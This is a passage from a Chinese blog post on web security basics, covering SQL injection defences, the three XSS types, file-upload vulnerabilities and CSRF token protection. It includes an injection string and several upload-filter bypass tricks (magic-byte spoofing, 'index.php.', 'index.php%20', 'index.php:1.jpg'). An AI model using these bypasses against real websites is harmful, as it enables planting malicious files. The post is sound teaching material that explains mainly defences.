<h3 id="如何防御-SQL-注入？"><a href="#如何防御-SQL-注入？" class="headerlink" title="如何防御 SQL 注入？"></a>如何防御 SQL 注入？</h3><h4 id="加入转义字符"><a href="#加入转义字符" class="headerlink" title="加入转义字符"></a>加入转义字符</h4><pre class="language-none"><code class="language-none">SELECT * FROM Users where username&#x3D;&quot;admin\&quot; OR \&quot;\&quot;!&#x3D;\&quot;&quot; AND password&#x3D;&quot;xxxx&quot;</code></pre>

<p> <code>\&quot;</code> 引号经过转义后，只会被当成单纯的一个字符，而不是句子结构的一部分</p>
<blockquote>
<p>扩展：</p>
<p>SQL 语句中，AND 运算符的优先级高于 OR 运算符</p>
<p>所以执行顺序是</p>
<p>xxxx OR (xxxx AND xxxx)</p>
</blockquote>
<h4 id="预编译-SQL"><a href="#预编译-SQL" class="headerlink" title="预编译 SQL"></a>预编译 SQL</h4><p>在 Java 中，预编译 SQL 通过 PreparedStatement 和占位符 <code>?</code> 来实现</p>
<p>使用预编译后的 SQL 语句，输入的数据不会再次编译，只会当成参数来处理，比如 <code>AND</code> <code>OR</code> 就不会被处理</p>
<h2 id="XSS（Cross-Site-Scripting，跨站脚本攻击）"><a href="#XSS（Cross-Site-Scripting，跨站脚本攻击）" class="headerlink" title="XSS（Cross Site Scripting，跨站脚本攻击）"></a>XSS（Cross Site Scripting，跨站脚本攻击）</h2><blockquote>
<p>目前，网页渲染的方式无非两种：</p>
<ul>
<li>前端渲染，即客户端渲染，在前端通过 JavaScript 脚本操作 DOM 节点，动态调整 HTML 网页内容</li>
<li>后端渲染，即服务端渲染，在后端渲染好 HTML 网页后，返回给浏览器进行显示</li>
</ul>
<p>无论采用哪种方式，本质上都是将数据拼接在 HTML 代码中，渲染后呈现给用户</p>
</blockquote>
<p>XSS 与 SQL 注入都是典型的<strong>代码注入攻击</strong>，SQL 注入是将恶意代码插入 SQL 语句中，XSS 则是将恶意代码插入 HTML 代码中</p>
<p>XSS 有三大类：存储型 XSS、反射型 XSS、DOM 型 XSS</p>
<p>存储型、反射型属于后端漏洞，DOM 型属于前端漏洞</p>
<p>存储型和反射型的区别：存储型 XSS 的恶意代码存储在目标数据库中，反射型 XSS 的恶意代码是存储在 URL 中</p>
<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><ol>
<li>攻击者将恶意代码提交到目标网站数据库中</li>
<li>用户打开网站时，服务器将恶意代码从数据库中取出，拼接到 HTML 代码中，并返回给浏览器</li>
<li>浏览器接收 HTML 网页后解析执行，其中的恶意代码也随之执行</li>
<li>攻击者窃取用户数据</li>
</ol>
<p>存储型 XSS 常见于具有<strong>保存用户数据功能</strong>的网页，如论坛发帖、商品评论、用户私信等</p>
<h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><ol>
<li>攻击者构造恶意 URL</li>
<li>用户打开恶意 URL，网站服务器将恶意代码从 URL 中取出，拼接在 HTML 代码中，并返回给浏览器</li>
<li>浏览器接收 HTML 代码后解析执行，其中的恶意代码也随之执行</li>
<li>攻击者窃取用户数据</li>
</ol>
<p>反射型 XSS 常见于网页搜索、链接跳转等</p>
<p>由于需要用户主动打开 URL，攻击者会用多种手段诱导用户点击</p>
<blockquote>
<p>POST 提交也可以触发反射型 XSS，但条件比较苛刻（需要构造表单），所以比较少见</p>
</blockquote>
<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><ol>
<li>攻击者构造恶意 URL</li>
<li>用户打开恶意 URL</li>
<li>浏览器接收对应 URL 响应后解析执行，前端 JavaScript 取出恶意代码并执行</li>
<li>攻击者窃取用户数据</li>
</ol>
<p>DOM 型 XSS 与前两者类似，只不过 DOM 型是由浏览器取出恶意代码，属于前端 JavaScript 自身的漏洞</p>
<h3 id="如何防御-XSS？"><a href="#如何防御-XSS？" class="headerlink" title="如何防御 XSS？"></a>如何防御 XSS？</h3><h4 id="防御存储型、反射型"><a href="#防御存储型、反射型" class="headerlink" title="防御存储型、反射型"></a>防御存储型、反射型</h4><p>防御这两种 XSS，有两种办法：</p>
<ul>
<li>改为纯前端渲染，当然接下来要考虑防御 DOM 型</li>
<li>转义 HTML 代码，此时要使用业内成熟的转义库</li>
</ul>
<h4 id="防御-DOM-型"><a href="#防御-DOM-型" class="headerlink" title="防御 DOM 型"></a>防御 DOM 型</h4><p>DOM 型实际上是前端代码不够严谨，把用户输入当作代码执行</p>
<p>核心思想是避免在代码中拼接不可信数据，比如将 <code>innerHTML()</code> 改为 <code>innerText()</code></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>网站对文件的上传没有做严格的过滤，导致攻击者可以上传一些恶意文件，从而获取网站权限、窃取用户数据</p>
<p>恶意文件可以是木马、脚本、病毒等</p>
<blockquote>
<p>注意区别后台权限、网站权限</p>
</blockquote>
<h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>网站仅在前端检测上传文件的类型，这样可以通过抓包，然后修改请求内容进行绕过</p>
<h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>网站使用文件头字节来检测文件类型，这样可以在文件头加入对应的字节来绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/Rayucan/imageCloud/data/202303021700007.png" alt="image-20230302170001705" loading="lazy"></p>
<h3 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h3><p>在 Windows 系统中，上传 <code>index.php.</code> 会被重命名为  <code>.</code></p>
<p>也可以尝试  <code>index.php%20</code> <code>index.php:1.jpg</code> 等</p>
<h3 id="如何查找和判断文件上传漏洞？"><a href="#如何查找和判断文件上传漏洞？" class="headerlink" title="如何查找和判断文件上传漏洞？"></a>如何查找和判断文件上传漏洞？</h3><h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p>黑盒测试，即<strong>不知道网站源码</strong>的情况下进行漏洞分析</p>
<p>使用扫描工具，扫描网站，找到上传入口</p>
<h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><p>直接分析源代码</p>
<h2 id="CSRF（Cross-Site-Request-Forgery，跨站请求伪造）"><a href="#CSRF（Cross-Site-Request-Forgery，跨站请求伪造）" class="headerlink" title="CSRF（Cross Site Request Forgery，跨站请求伪造）"></a>CSRF（Cross Site Request Forgery，跨站请求伪造）</h2><p>HTTP 协议是无状态的，需要通过 Cookie 等手段将用户信息保存在浏览器中，当发起 HTTP 请求后，浏览器自动携带 Cookie 进行认证</p>
<p>利用这一点，攻击者可以诱导用户在 Cookie 已认证的情况下，执行恶意操作</p>
<p>比如，用户已登录一个网上银行账户，攻击者诱导用户点击一张图片，其中含有转账 URL，一旦用户点击，就会在不知情的情况下向攻击者转账，触发 CSRF 攻击</p>
<p>CSRF 攻击可以分为 <strong>GET 型和 POST 型</strong></p>
<p>上述例子中，转账是 GET 请求发出的，但是 POST 请求也未必安全</p>
<p>虽然 POST 请求无法通过链接触发，但可以通过表单提交触发</p>
<h3 id="如何防御-CSRF-攻击？"><a href="#如何防御-CSRF-攻击？" class="headerlink" title="如何防御 CSRF 攻击？"></a>如何防御 CSRF 攻击？</h3><p>CSRF 攻击的一个特点是，虽然攻击者可以冒充用户携带 Cookie 进行认证，但是无法知道具体的 Cookie 内容</p>
<p>那么就可以要求用户每次提交请求都要携带一个特殊的 Token，服务器通过校验 Token 来区分正常的请求和 CSRF 攻击</p>
<h4 id="令牌校验"><a href="#令牌校验" class="headerlink" title="令牌校验"></a>令牌校验</h4><p>每次用户打开网页，服务器给用户发送一个 Token，且该 Token 经过了加密，并保存在服务器 Session 中</p>
<p>对于 GET 请求，浏览器将 Token 作为参数附加在 URL 链接之后</p>
<p>对于 POST 请求，浏览器将 Token 附加在表单参数中</p>
<h4 id="验证码校验"><a href="#验证码校验" class="headerlink" title="验证码校验"></a>验证码校验</h4><p>加入手机验证码校验，每次提交请求，就要求用户提供手机验证码，这样可以彻底防止 CSRF 攻击</p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>丁真</li><li class="post-copyright-link"><strong>Post link: </strong><a href="http://example.com/2023/02/23/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80/" title="网安基础">http://example.com/2023/02/23/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2023/03/03/cpp/" rel="prev" title="C++"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">C++</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2023/02/18/%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/" rel="next" title="推荐系统"><span class="post-nav-text">推荐系统</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2020 – 2023 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> 丁真</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>